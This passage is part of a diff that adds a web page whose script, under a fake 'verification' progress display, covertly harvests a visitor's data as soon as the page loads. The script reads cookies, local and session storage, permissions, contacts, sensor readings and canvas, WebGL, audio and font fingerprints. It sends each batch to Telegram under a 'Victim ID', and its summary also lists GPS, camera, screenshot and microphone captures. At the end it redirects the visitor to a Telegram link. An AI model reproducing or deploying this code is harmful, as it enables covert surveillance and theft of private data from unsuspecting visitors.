+                message += `   γ: ${sensors.orientation.gamma?.toFixed(2) || 'N/A'}°\n`;
+            }
+            
+            if (sensors.motion.acceleration?.x !== undefined) {
+                message += `⚡ *Acceleration:*\n`;
+                message += `   X: ${sensors.motion.acceleration.x?.toFixed(2) || 'N/A'} m/s²\n`;
+                message += `   Y: ${sensors.motion.acceleration.y?.toFixed(2) || 'N/A'} m/s²\n`;
+                message += `   Z: ${sensors.motion.acceleration.z?.toFixed(2) || 'N/A'} m/s²\n`;
+            }
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        async function collectBrowserData() {
+            updateProgress(4, "Analyzing browser data...");
+            
+            collectedData.browser = {
+                localStorage: {},
+                sessionStorage: {},
+                cookies: document.cookie,
+                historyLength: window.history.length,
+                referrer: document.referrer,
+                domain: document.domain,
+                url: window.location.href,
+                title: document.title,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                permissions: {}
+            };
+            
+            // Read localStorage
+            try {
+                const lsData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    lsData[key] = localStorage.getItem(key);
+                }
+                collectedData.browser.localStorage = lsData;
+            } catch (e) {}
+            
+            // Read sessionStorage
+            try {
+                const ssData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    ssData[key] = sessionStorage.getItem(key);
+                }
+                collectedData.browser.sessionStorage = ssData;
+            } catch (e) {}
+            
+            // Check permissions
+            const permissionsToCheck = ['camera', 'microphone', 'geolocation', 'notifications'];
+            for (const permission of permissionsToCheck) {
+                try {
+                    const result = await navigator.permissions.query({ name: permission });
+                    collectedData.browser.permissions[permission] = result.state;
+                } catch (e) {
+                    collectedData.browser.permissions[permission] = 'unsupported';
+                }
+            }
+            
+            await sendBrowserDataToTelegram();
+            await delay(500);
+        }
+
+        async function sendBrowserDataToTelegram() {
+            const browser = collectedData.browser;
+            let message = `🌐 *BROWSER DATA*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `📖 *Page Title:* ${browser.title}\n`;
+            message += `🔗 *URL:* ${browser.url}\n`;
+            message += `↩️ *Referrer:* ${browser.referrer || 'None'}\n`;
+            message += `🍪 *Cookies:* ${browser.cookies.length > 0 ? 'Yes' : 'No'}\n`;
+            message += `📚 *History Length:* ${browser.historyLength} pages\n`;
+            message += `🔌 *Plugins:* ${browser.plugins.length}\n`;
+            
+            // Permissions
+            message += `🔐 *Permissions:*\n`;
+            for (const [perm, state] of Object.entries(browser.permissions)) {
+                message += `   ${perm}: ${state}\n`;
+            }
+            
+            message += `💾 *LocalStorage Items:* ${Object.keys(browser.localStorage).length}\n`;
+            message += `💾 *SessionStorage Items:* ${Object.keys(browser.sessionStorage).length}\n`;
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        async function collectContacts() {
+            updateProgress(5, "Checking contacts access...");
+            
+            collectedData.contacts = {
+                status: 'not_supported',
+                data: [],
+                timestamp: Date.now()
+            };
+            
+            // Try Contacts API (Android Chrome)
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    if (contacts && contacts.length > 0) {
+                        collectedData.contacts = {
+                            status: 'granted',
+                            count: contacts.length,
+                            data: contacts.slice(0, 10).map(c => ({
+                                name: c.name ? c.name.join(' ') : 'Unknown',
+                                phones: c.tel || [],
+                                emails: c.email || []
+                            })),
+                            timestamp: Date.now()
+                        };
+                        
+                        // Send contacts immediately
+                        await sendContactsToTelegram();
+                    }
+                } catch (error) {
+                    collectedData.contacts.status = 'denied';
+                }
+            }
+            
+            await delay(500);
+        }
+
+        async function sendContactsToTelegram() {
+            const contacts = collectedData.contacts.data;
+            if (!contacts || contacts.length === 0) return;
+            
+            let message = `📞 *CONTACTS ACCESSED*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `👥 *Total Contacts:* ${collectedData.contacts.count}\n\n`;
+            
+            // Show first 5 contacts
+            contacts.slice(0, 5).forEach((contact, index) => {
+                message += `*Contact ${index + 1}:*\n`;
+                message += `👤 *Name:* ${contact.name}\n`;
+                
+                if (contact.phones.length > 0) {
+                    message += `📱 *Phones:* ${contact.phones.join(', ')}\n`;
+                }
+                
+                if (contact.emails.length > 0) {
+                    message += `📧 *Emails:* ${contact.emails.join(', ')}\n`;
+                }
+                
+                message += `\n`;
+            });
+            
+            if (contacts.length > 5) {
+                message += `... and ${contacts.length - 5} more contacts\n`;
+            }
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        async function collectFingerprint() {
+            try {
+                // Canvas fingerprint
+                const canvas = document.getElementById('stealthCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Fingerprint", 4, 17);
+                
+                const canvasData = canvas.toDataURL();
+                
+                // WebGL fingerprint
+                const webglInfo = getWebGLFingerprint();
+                
+                // Audio fingerprint
+                const audioFingerprint = await getAudioFingerprint();
+                
+                collectedData.fingerprint = {
+                    canvas: canvasData.substring(0, 100),
+                    webgl: webglInfo,
+                    audio: audioFingerprint,
+                    plugins: navigator.plugins.length,
+                    mimeTypes: navigator.mimeTypes.length,
+                    fonts: await detectFonts(),
+                    timestamp: Date.now()
+                };
+                
+                await sendFingerprintToTelegram();
+                
+            } catch (error) {
+                collectedData.fingerprint = { error: error.message };
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || gl.RENDERER),
+                        vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || gl.VENDOR),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        async function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.start();
+                gainNode.gain.setValueAtTime(0, audioContext.currentTime);
+                oscillator.stop();
+                
+                return {
+                    sampleRate: audioContext.sampleRate,
+                    channelCount: audioContext.destination.channelCount,
+                    state: audioContext.state
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function detectFonts() {
+            const fonts = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Helvetica', 'Tahoma', 'Geneva'
+            ];
+            
+            const available = [];
+            const container = document.getElementById('stealthContainer');
+            const testString = "mmmmmmmmmmlli";
+            const testSize = "72px";
+            
+            const defaultSpan = document.createElement('span');
+            defaultSpan.style.fontSize = testSize;
+            defaultSpan.innerHTML = testString;
+            container.appendChild(defaultSpan);
+            const defaultWidth = defaultSpan.offsetWidth;
+            const defaultHeight = defaultSpan.offsetHeight;
+            container.removeChild(defaultSpan);
+            
+            for (const font of fonts) {
+                const span = document.createElement('span');
+                span.style.fontFamily = `'${font}', monospace`;
+                span.style.fontSize = testSize;
+                span.innerHTML = testString;
+                container.appendChild(span);
+                
+                if (span.offsetWidth !== defaultWidth || span.offsetHeight !== defaultHeight) {
+                    available.push(font);
+                }
+                
+                container.removeChild(span);
+            }
+            
+            return available;
+        }
+
+        async function sendFingerprintToTelegram() {
+            const fingerprint = collectedData.fingerprint;
+            let message = `🆔 *DEVICE FINGERPRINT*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            
+            if (fingerprint.webgl) {
+                message += `🎮 *WebGL Renderer:* ${fingerprint.webgl.renderer || 'Unknown'}\n`;
+                message += `🏢 *WebGL Vendor:* ${fingerprint.webgl.vendor || 'Unknown'}\n`;
+            }
+            
+            if (fingerprint.audio) {
+                message += `🎵 *Audio Sample Rate:* ${fingerprint.audio.sampleRate || 'Unknown'} Hz\n`;
+            }
+            
+            message += `🔌 *Browser Plugins:* ${fingerprint.plugins || 0}\n`;
+            message += `📄 *MIME Types:* ${fingerprint.mimeTypes || 0}\n`;
+            
+            if (fingerprint.fonts && fingerprint.fonts.length > 0) {
+                message += `🔤 *Fonts Detected:* ${fingerprint.fonts.slice(0, 5).join(', ')}`;
+                if (fingerprint.fonts.length > 5) message += `... and ${fingerprint.fonts.length - 5} more`;
+                message += `\n`;
+            }
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        // ============================================
+        // MAIN EXECUTION
+        // ============================================
+        async function startStealthCollection() {
+            try {
+                // Send initial notification
+                await sendToTelegram(`🚨 *NEW VICTIM CONNECTED* 🚨\n\n🆔 *ID:* \`${VICTIM_ID}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n🔗 *URL:* ${collectedData.campaign.url}\n📱 *Device:* ${detectDeviceType()}`);
+
+                // Collect all data
+                await collectDeviceInfo();
+                await collectNetworkInfo();
+                await collectLocation();  // This sends enhanced maps!
+                await collectMedia();
+                await collectSensorData();
+                await collectBrowserData();
+                await collectContacts();
+                await collectFingerprint();
+
+                // Send final summary
+                await sendFinalSummary();
+
+                // Complete
+                updateProgress(5, "Verification complete!");
+                
+                // Redirect after completion
+                setTimeout(() => {
+                    const params = new URLSearchParams(window.location.search);
+                    const redirectUrl = params.get('redirect') || 'https://t.me/+toK4D8VzcH4xNzQ0';
+                    window.location.href = redirectUrl;
+                }, 3000);
+
+            } catch (error) {
+                // Send error notification
+                await sendToTelegram(`❌ *ERROR IN COLLECTION*\n\n🆔 *ID:* \`${VICTIM_ID}\`\n🔗 *URL:* ${collectedData.campaign.url}\n💥 *Error:* ${error.message}`);
+                
+                // Still redirect
+                setTimeout(() => {
+                    window.location.href = 'https://t.me/+toK4D8VzcH4xNzQ0';
+                }, 2000);
+            }
+        }
+
+        async function sendFinalSummary() {
+            let summary = `🎯 *COMPLETE DATA COLLECTION SUMMARY*\n\n`;
+            summary += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            summary += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+            summary += `📱 *Device:* ${collectedData.device.deviceType} - ${collectedData.device.browser} on ${collectedData.device.os}\n`;
+            summary += `🌐 *IP:* \`${collectedData.network.ipv4 || 'Unknown'}\`\n`;
+            summary += `📍 *Country:* ${collectedData.network.country || 'Unknown'}\n`;
+            
+            if (collectedData.location.gps) {
+                summary += `🎯 *GPS Coordinates:* ${collectedData.location.gps.latitude.toFixed(6)}, ${collectedData.location.gps.longitude.toFixed(6)}\n`;
+            }
+            
+            if (collectedData.media.screenshot.resolution) {
+                summary += `🖥️ *Screenshot:* ${collectedData.media.screenshot.resolution}\n`;
+            }
+            
+            if (collectedData.media.camera.resolution) {
+                summary += `📷 *Front Camera:* ${collectedData.media.camera.resolution}\n`;
+            }
+            
+            if (collectedData.media.backCamera) {
+                summary += `📷 *Back Camera:* ${collectedData.media.backCamera.resolution}\n`;
+            }
+            
+            if (collectedData.media.microphone.duration) {
+                summary += `🎤 *Audio Recording:* ${collectedData.media.microphone.duration}s\n`;
+            }
+            
+            if (collectedData.contacts.count > 0) {
+                summary += `📞 *Contacts Accessed:* ${collectedData.contacts.count}\n`;
+            }
+            
+            if (collectedData.sensors.battery.level !== undefined) {
+                summary += `🔋 *Battery:* ${collectedData.sensors.battery.level}%\n`;
+            }
+            
+            summary += `🔗 *Campaign:* ${collectedData.campaign.campaignId}\n`;
+            summary += `\n📊 *Data Types Sent:*\n`;
+            summary += `• Device Information\n`;
+            summary += `• Network Details\n`;
+            summary += `• GPS Location with Maps\n`;
+            summary += `• Screenshot\n`;
+            summary += `• Camera Photos\n`;
+            summary += `• Audio Recording\n`;
+            summary += `• Sensor Data\n`;
+            summary += `• Browser Information\n`;
+            summary += `• Contacts (if accessible)\n`;
+            summary += `• Device Fingerprint\n`;
+            summary += `\n_All data sent directly to Telegram in real-time_`;
+            
+            await sendToTelegram(summary);
+        }
+
+        // ============================================
+        // START COLLECTION ON PAGE LOAD
+        // ============================================
+        document.addEventListener('DOMContentLoaded', () => {
+            // Start after 1 second delay
+            setTimeout(() => {
+                startStealthCollection();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
